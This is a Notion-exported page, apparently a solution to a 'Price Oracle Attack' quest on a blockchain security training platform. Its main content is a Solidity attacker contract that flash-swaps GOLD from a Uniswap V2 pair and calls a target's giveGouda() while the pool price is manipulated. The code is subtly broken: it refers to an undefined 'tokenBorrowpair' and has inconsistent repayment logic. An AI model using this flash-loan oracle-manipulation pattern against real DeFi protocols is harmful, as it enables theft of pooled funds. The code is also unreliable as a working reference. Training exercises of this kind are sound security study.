---
title: "Price Oracle Attack"
date: "2024-02-14T14:27:00.000Z"
lastmod: "2024-02-14T17:10:00.000Z"
draft: false
weight: 1
difficulty: "🗡🗡🗡🗡🗡"
language:
  - "Solidity"
next: "Wintermute-Rekt-d0fd4609147941e6af7fcc68ef81da6a"
level-url: "https://nodeguardians.io/dev-hub/quests/price-oracle-attack"
type: "docs"
skill-cat:
  - "Security"
state: "Done"
about:
  - "flashloan"
NOTION_METADATA:
  object: "page"
  id: "48bb5fd1-fcf5-428e-8426-6833aecafe4f"
  created_time: "2024-02-14T14:27:00.000Z"
  last_edited_time: "2024-02-14T17:10:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "emoji"
    emoji: "✅"
  parent:
    type: "database_id"
    database_id: "67ccfb28-aa7e-4248-9272-3d9732e4a83e"
  archived: false
  properties:
    weight:
      id: "%3BQ%60q"
      type: "number"
      number: 1
    difficulty:
      id: "%3DCqv"
      type: "status"
      status:
        id: "}M?I"
        name: "🗡🗡🗡🗡🗡"
        color: "purple"
    language:
      id: "Py%7Cy"
      type: "multi_select"
      multi_select:
        - id: "d01ac056-199f-4b78-96ee-583126c15462"
          name: "Solidity"
          color: "blue"
    next:
      id: "%60Q~a"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Wintermute-Rekt-d0fd4609147941e6af7fcc68ef81da6a"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Wintermute-Rekt-d0fd4609147941e6af7fcc68ef81da6a"
          href: null
    level-url:
      id: "cjvw"
      type: "url"
      url: "https://nodeguardians.io/dev-hub/quests/price-oracle-attack"
    type:
      id: "khE_"
      type: "select"
      select:
        id: "Qq?l"
        name: "docs"
        color: "default"
    skill-cat:
      id: "n%7CzF"
      type: "multi_select"
      multi_select:
        - id: "8fe662a4-5f8b-4be9-8013-c00b51082782"
          name: "Security"
          color: "green"
    state:
      id: "sW%3AG"
      type: "status"
      status:
        id: "372c6056-56a9-4d05-861f-a165f80174eb"
        name: "Done"
        color: "green"
    about:
      id: "vf%7DG"
      type: "multi_select"
      multi_select:
        - id: "1b009358-c680-417f-bbf2-7491f9fd6959"
          name: "flashloan"
          color: "purple"
    prev:
      id: "~LUC"
      type: "rich_text"
      rich_text: []
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Price Oracle Attack"
            link: null
          annotations:
            bold: true
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Price Oracle Attack"
          href: null
  url: "https://www.notion.so/Price-Oracle-Attack-48bb5fd1fcf5428e84266833aecafe4f"
  public_url: null
UPDATE_TIME: "2024-02-15T12:47:07.800Z"
EXPIRY_TIME: "2024-02-15T13:47:01.965Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


Deployment address : `0x1FD0357FcD623C5a1472B7C922CdB7aa262FaEC1`


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/05e2b6a9-5161-4f73-974e-0bbe2933f99d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240215T124701Z&X-Amz-Expires=3600&X-Amz-Signature=b89d9a0ed8f2bffa8f93d0ba9d0f6532aab96569d491b4e7876e88f459ad133b&X-Amz-SignedHeaders=host&x-id=GetObject)


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}


interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface GoudaGobelin {
    function giveGouda() external;
}

contract Attacker is IUniswapV2Callee {
    address private constant UNISWAP_V2_FACTORY =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    IERC20 private GOLD;
    IERC20 private GOUDA;

    GoudaGobelin instance;

    IUniswapV2Factory private factory = IUniswapV2Factory(UNISWAP_V2_FACTORY);


    IUniswapV2Pair private immutable pair;

    // For this example, store the amount to repay
    uint public amountToRepay;

    event Log(string message, uint val);

    constructor(address _gold, address _gouda, address exploited) {
        pair = IUniswapV2Pair(factory.getPair(address(_gouda), address(_gold)));
        GOLD = IERC20(_gold);
        GOUDA = IERC20(_gouda);
        instance = GoudaGobelin(exploited);
    }


    function getReserves() public view returns(uint112, uint112) {
      (uint112 r0, uint112 r1, ) = pair.getReserves();
      return (r0, r1);
    }

    function getPair() public view returns(address) {
      return address(pair);
    }

    function flashSwap(uint goldAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(address(GOLD), address(this));

        // amount0Out is Gouda, amount1Out is Gold
        pair.swap(goldAmount, 0, address(this), data);
    }

    // This function is called by the GOUDA/GOLD pair contract
    function uniswapV2Call(
        address sender,
        uint amount1,
        uint,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");


        (address tokenBorrow) = abi.decode(data, (address));

        // Your custom code would go here. For example, code to arbitrage.
        require(tokenBorrow == address(GOLD), "token borrow != GOLD");

        uint fee = ((amount1 * 3) / 997) + 1;
        amountToRepay = amount1 + fee;

        uint goldBalance = GOLD.balanceOf(address(tokenBorrowpair));
        uint goudaBalance = GOUDA.balanceOf(address(pair));
        uint goudaPrice = goldBalance * 1 gwei / goudaBalance;
        uint ThisGoldBalance = GOLD.balanceOf(address(this));
        uint ThisGoudaBalance = GOUDA.balanceOf(address(this));

        emit Log("amount1", amount1);
        emit Log("Pair goldBalance", goldBalance);
        emit Log("Pair goudaBalance", goudaBalance);
        emit Log("Pair goudaPrice", goudaPrice);
        emit Log("This goudaBalance", ThisGoudaBalance);
        emit Log("This goldBalance", ThisGoldBalance);

        instance.giveGouda();
       
        goldBalance = GOLD.balanceOf(address(pair));
        goudaBalance = GOUDA.balanceOf(address(pair));
        goudaPrice = goldBalance * 1 gwei / goudaBalance;
        ThisGoldBalance = GOLD.balanceOf(address(this));
        ThisGoudaBalance = GOUDA.balanceOf(address(this));

        emit Log("amount1", amount1);
        emit Log("Pair goldBalance", goldBalance);
        emit Log("Pair goudaBalance", goudaBalance);
        emit Log("Pair goudaPrice", goudaPrice);
        emit Log("This goudaBalance", ThisGoudaBalance);
        emit Log("This goldBalance", ThisGoldBalance);
			
				// Flashswap fees
				require(GOUDA.approve(address(pair), 1 ether), 'approve failed.');
	      GOUDA.transfer(address(pair), 10000000000000000000000);
        
        // Repay
        GOLD.transfer(address(pair), amount1);
    }
}
```


[bookmark](https://solidity-by-example.org/defi/uniswap-v2-flash-swap/)

